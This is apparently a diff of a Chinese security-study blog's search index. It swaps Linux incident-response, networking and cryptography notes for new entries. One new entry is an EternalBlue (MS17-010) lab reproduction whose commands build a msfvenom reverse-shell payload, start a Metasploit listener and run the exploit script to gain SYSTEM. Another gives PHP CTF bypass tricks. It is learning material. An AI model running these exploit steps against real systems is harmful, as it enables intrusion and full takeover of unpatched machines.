-    <url>/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
-    <content><![CDATA[<h2 id="思路"><a class="header-anchor" href="#思路"></a>思路</h2>
-<h3 id="准备"><a class="header-anchor" href="#准备"></a>准备</h3>
-<p>准备检测工具和人员</p>
-<h3 id="检测与分析"><a class="header-anchor" href="#检测与分析"></a>检测与分析</h3>
-<p>紧急事件监测，包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户</p>
-<p>甚至还有管理员的报告(收到的邮件和短信)， 从这些数据中判断出受灾面积和攻击者入侵的点</p>
-<h3 id="抑制缓解"><a class="header-anchor" href="#抑制缓解"></a>抑制缓解</h3>
-<p>首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。</p>
-<h3 id="攻击根除"><a class="header-anchor" href="#攻击根除"></a>攻击根除</h3>
-<p>紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到正常水平</p>
-<h3 id="业务恢复"><a class="header-anchor" href="#业务恢复"></a>业务恢复</h3>
-<h3 id="事件跟踪"><a class="header-anchor" href="#事件跟踪"></a>事件跟踪</h3>
-<p>根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程</p>
-<h2 id="入侵排查"><a class="header-anchor" href="#入侵排查"></a>入侵排查</h2>
-<h3 id="Linux常用检查命令"><a class="header-anchor" href="#Linux常用检查命令"></a>Linux常用检查命令</h3>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>last</td>
-<td>显示的是目前与过去登入系统的用户相关信息</td>
-</tr>
-<tr>
-<td>lastlog</td>
-<td>显示所有用户的登录情况</td>
-</tr>
-<tr>
-<td>lastb</td>
-<td>显示用户错误的登录列表</td>
-</tr>
-<tr>
-<td>who</td>
-<td>显示的是当前登录的用户</td>
-</tr>
-<tr>
-<td>w</td>
-<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
-</tr>
-<tr>
-<td>history</td>
-<td>查看历史命令记录</td>
-</tr>
-</tbody>
-</table>
-<h3 id="排查过程"><a class="header-anchor" href="#排查过程"></a>排查过程</h3>
-<ul>
-<li>
-<p>检查账号及登录情况</p>
-<p>见这篇文章：<a href="https://dawnyh99.github.io/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Linux系统加固</a></p>
-</li>
-<li>
-<p>检查历史命令</p>
-</li>
-</ul>
-<pre><code class="language-bash">cat ~/bash_history &gt;&gt; history.txt
+    <title>MS17-010漏洞复现</title>
+    <url>/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<pre><code>nasm -f bin eternalblue_kshellcode_x64.asm
 </code></pre>
-<ul>
-<li>检查网络连接/开放端口</li>
-</ul>
-<pre><code class="language-bash">netstat -antlp | more
-
-#查看 PID 所对应的进程文件路径
-file /proc/$PID/exe
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f raw -o reverse_shell.bin EXITFUNC=thread LHOST=192.168.233.128 LPORT=9090
 </code></pre>
-<ul>
-<li>检查异常进程</li>
-</ul>
-<pre><code class="language-bash">ps aux | grep pid
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<pre><code>cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin
 </code></pre>
-<p><img src="/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20210313142418258.png" alt="image-20210313142418258"></p>
-<ul>
-<li>检查开机启动项</li>
-</ul>
-<pre><code class="language-bash">ls /etc/init.d/
-
-ls -l /etc/rc3.d/
-ls -l /etc/rc5.d/
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/shell/reverse_tcp
+set LHOST 192.168.233.128
+set LPORT 9090
+exploit
 </code></pre>
-<ul>
-<li>检查定时任务</li>
-</ul>
-<pre><code class="language-bash">ls -al /var/spool/cron/* 
-cat /etc/crontab
-/etc/cron.d/*
-/etc/cron.daily/* 
-/etc/cron.hourly/* 
-/etc/cron.monthly/*
-/etc/cron.weekly/
-
-#查看目录下所有文件
-more /etc/cron.d/*
-
-/etc/anacrontab
-/var/spool/anacron/*
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<pre><code>python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500
 </code></pre>
-<ul>
-<li>检查服务</li>
-</ul>
-<pre><code class="language-bash">#CentOS
-chkconfig  --list  #查看服务自启动状态，可以看到所有的RPM包安装的服务
-#Debian
-service --status-all
-systemctl list-units
-#源码包安装的服务位置
-/usr/local/
-</code></pre>
-<ul>
-<li>
-<p>检查异常文件</p>
-<ul>
-<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</li>
-<li>针对可疑文件可以使用<code>stat</code>查看创建修改时间</li>
-<li>发现WebShell、远控木马的创建时间</li>
-</ul>
-<p>找出同一时间范围内创建的文件？</p>
-</li>
-</ul>
-<pre><code class="language-bash">find ./ -iname &quot;*&quot; -atime 1 -type f 
-#找出 ./ 下一天前访问过的文件
-</code></pre>
-<ul>
-<li>检查日志文件</li>
-</ul>
-<p>日志默认存放位置：/var/log/</p>
-<p>查看日志配置情况：more /etc/rsyslog.conf</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">日志文件</th>
-<th style="text-align:center">说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">/var/log/cron</td>
-<td style="text-align:center">记录系统定时任务相关的日志</td>
-</tr>
-<tr>
-<td style="text-align:center">/var/log/message</td>
-<td style="text-align:center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
-</tr>
-<tr>
-<td style="text-align:center">/var/log/syslog</td>
-<td style="text-align:center">只记录警告信息，常常是系统出问题的信息</td>
-</tr>
-<tr>
-<td style="text-align:center">/var/log/btmp</td>
-<td style="text-align:center">记录<strong>错误登录（登陆失败）<strong>日志；使用</strong>lastb</strong>命令查看</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>/var/log/lastlog</strong></td>
-<td style="text-align:center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>/var/log/wtmp</strong></td>
-<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
-</tr>
-<tr>
-<td style="text-align:center"><strong>/var/log/utmp</strong></td>
-<td style="text-align:center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
-</tr>
-<tr>
-<td style="text-align:center">/var/log/secure</td>
-<td style="text-align:center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td>
-</tr>
-<tr>
-<td style="text-align:center">/var/log/apache2/error.log</td>
-<td style="text-align:center">apache错误日志，如果安装有modsecurity那么其攻击拦截日志也存在这里</td>
-</tr>
-</tbody>
-</table>
-<h3 id="Webshell排查"><a class="header-anchor" href="#Webshell排查"></a>Webshell排查</h3>
-<p>排查工具：河马 - - <a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
-<p>除了使用排查工具扫描，还是要手动查看Web目录下的可解析执行文件</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
 ]]></content>
       <categories>
-        <category>运维</category>
+        <category>渗透</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>运维</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1626,6 +2172,86 @@ exp()
         <tag>漏洞</tag>
         <tag>CTF</tag>
         <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计</title>
+    <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
+<h3 id="MD5"><a class="header-anchor" href="#MD5"></a>MD5</h3>
+<pre><code>$a[]=1;
+$b[]=2;
+md5($a)===md5($b);	//true
+</code></pre>
+<hr>
+<p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
+<p>以下这些字符串，md5哈希之后都是0e开头的：</p>
+<pre><code>QNKCDZO
+0e830400451993494058024219903391
+
+s878926199a
+0e545993274517709034328855841020
+
+s155964671a
+0e342768416822451524974117254469
+
+s214587387a
+0e848240448830537924465865611904
+
+s214587387a
+0e848240448830537924465865611904
+
+s878926199a
+0e545993274517709034328855841020
+
+//比较特殊的一个，加密前后进行比较的话会判断为相等
+0e215962017
+0e291242476940776845150308577824
+</code></pre>
+<h3 id="intval"><a class="header-anchor" href="#intval"></a>intval</h3>
+<p>得到一个数的整型值。</p>
+<pre><code class="language-php">&lt;?php
+echo intval(42);                      // 42
+echo intval(4.2);                     // 4
+echo intval('42');                    // 42
+echo intval('+42');                   // 42
+echo intval('-42');                   // -42
+echo intval(042);                     // 34
+echo intval('042');                   // 42
+echo intval(1e10);                    // 1410065408
+echo intval('1e10');                  // 1
+echo intval(0x1A);                    // 26
+echo intval('0x1A');				  // 0
+echo intval(42000000);                // 42000000
+echo intval(420000000000000000000);   // 0
+echo intval('420000000000000000000'); // 2147483647
+echo intval(42, 8);                   // 42
+echo intval('42', 8);                 // 34
+echo intval(array());                 // 0
+echo intval(array('foo', 'bar'));     // 1
+?&gt;
+</code></pre>
+<p>比如在以下代码中</p>
+<pre><code class="language-php">$a = $_GET['a'];
+if(intval($a)&lt;2020 &amp;&amp; intval($a+1)&gt;2020)
+	echo $flag;
+</code></pre>
+<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
+<pre><code>?a=0x10ff	//在进行+1运算时，$a会被转换为数值型进行运算.
+</code></pre>
+<h3 id="is-numeric"><a class="header-anchor" href="#is-numeric"></a>is_numeric</h3>
+<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
+<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
+<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand"></a>mt_rand</h3>
+<p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -1711,86 +2337,6 @@ SetHandler application/x-httpd-php
         <tag>漏洞</tag>
         <tag>CTF</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码审计</title>
-    <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
-<h3 id="MD5"><a class="header-anchor" href="#MD5"></a>MD5</h3>
-<pre><code>$a[]=1;
-$b[]=2;
-md5($a)===md5($b);	//true
-</code></pre>
-<hr>
-<p>md5计算结果为<code>0e...</code>的，会被当做0处理</p>
-<p>以下这些字符串，md5哈希之后都是0e开头的：</p>
-<pre><code>QNKCDZO
-0e830400451993494058024219903391
-
-s878926199a
-0e545993274517709034328855841020
-
-s155964671a
-0e342768416822451524974117254469
-
-s214587387a
-0e848240448830537924465865611904
-
-s214587387a
-0e848240448830537924465865611904
-
-s878926199a
-0e545993274517709034328855841020
-
-//比较特殊的一个，加密前后进行比较的话会判断为相等
-0e215962017
-0e291242476940776845150308577824
-</code></pre>
-<h3 id="intval"><a class="header-anchor" href="#intval"></a>intval</h3>
-<p>得到一个数的整型值。</p>
-<pre><code class="language-php">&lt;?php
-echo intval(42);                      // 42
-echo intval(4.2);                     // 4
-echo intval('42');                    // 42
-echo intval('+42');                   // 42
-echo intval('-42');                   // -42
-echo intval(042);                     // 34
-echo intval('042');                   // 42
-echo intval(1e10);                    // 1410065408
-echo intval('1e10');                  // 1
-echo intval(0x1A);                    // 26
-echo intval('0x1A');				  // 0
-echo intval(42000000);                // 42000000
-echo intval(420000000000000000000);   // 0
-echo intval('420000000000000000000'); // 2147483647
-echo intval(42, 8);                   // 42
-echo intval('42', 8);                 // 34
-echo intval(array());                 // 0
-echo intval(array('foo', 'bar'));     // 1
-?&gt;
-</code></pre>
-<p>比如在以下代码中</p>
-<pre><code class="language-php">$a = $_GET['a'];
-if(intval($a)&lt;2020 &amp;&amp; intval($a+1)&gt;2020)
-	echo $flag;
-</code></pre>
-<p>即可利用 intval 函数对字符串型16进制数的处理漏洞进行绕过</p>
-<pre><code>?a=0x10ff	//在进行+1运算时，$a会被转换为数值型进行运算.
-</code></pre>
-<h3 id="is-numeric"><a class="header-anchor" href="#is-numeric"></a>is_numeric</h3>
-<p>PHP的is_numeric()函数会判断参数是否为数字或者数字字符串</p>
-<p>绕过方法：在要输入的数字后加上<code>%20</code>（空格），或者在数字前或后加上<code>%00</code>（终止符）</p>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand"></a>mt_rand</h3>
-<p>生成伪随机数，利用<code>php_mt_seed</code>可以通过已知随机数数列爆破出随机数种子</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -1965,44 +2511,45 @@ if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
       </tags>
   </entry>
   <entry>
-    <title>密码算法</title>
-    <url>/2021/08/09/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
-<ul>
-<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
-<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
-<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
-<li>RC2：分组加密，输入输出均为64位</li>
-<li>RC4：流密码</li>
-<li>Blowfish：区块加密算法</li>
-</ul>
-<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
-<ul>
+    <title>Java 异常及处理</title>
+    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
 <li>
-<p>RSA：基于大数分解难题</p>
-<ul>
-<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
-<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
-<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
-<li>将p和q的记录销毁。</li>
-</ul>
-<p>其中(N，e)是公钥，(N，d)是私钥。</p>
-<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
 </li>
 <li>
-<p>DSA：基于整数有限域离散对数难题</p>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
 </li>
 <li>
-<p>ECC：椭圆曲线</p>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
 </li>
-</ul>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>专业课</category>
-        <category>密码学</category>
+        <category>编程语言</category>
+        <category>Java</category>
       </categories>
       <tags>
-        <tag>密码学</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -2098,504 +2645,6 @@ print(libnum.n2s(n))
       </tags>
   </entry>
   <entry>
-    <title>OSI模型</title>
-    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
-<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
-<p>能产生数据流量的并且能与用户交互的程序</p>
-<p>记事本不是，因为不能产生数据流量</p>
-<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
-<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
-<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
-<p>对话控制（记录该由谁来发送数据）</p>
-<p>令牌管理（禁止双方同时执行同一关键操作）</p>
-<p>同步功能（设置断点，崩溃恢复）</p>
-<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
-<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
-<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
-<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
-<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
-<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
-<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
-<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
-<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP&amp;IP</title>
-    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
-    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
-<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
-<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
-<ul>
-<li>
-<p>三次握手</p>
-<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
-<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
-<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
-<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
-<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
-<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
-<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
-</li>
-<li>
-<p>四次挥手</p>
-<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
-<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
-<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
-</li>
-</ul>
-<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
-<p>有连接/无连接（可靠/不可靠）</p>
-<p>有拆分合并/无拆分合并</p>
-<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
-<p>单播/多播</p>
-<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
-<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
-<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
-<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
-<p>http1.0 vs http1.1</p>
-<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
-<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
-<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
-<ul>
-<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
-<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
-<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
-<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
-<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
-<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
-<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
-<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
-</ul>
-<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
-<ul>
-<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>计网</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指令集和操作系统位数</title>
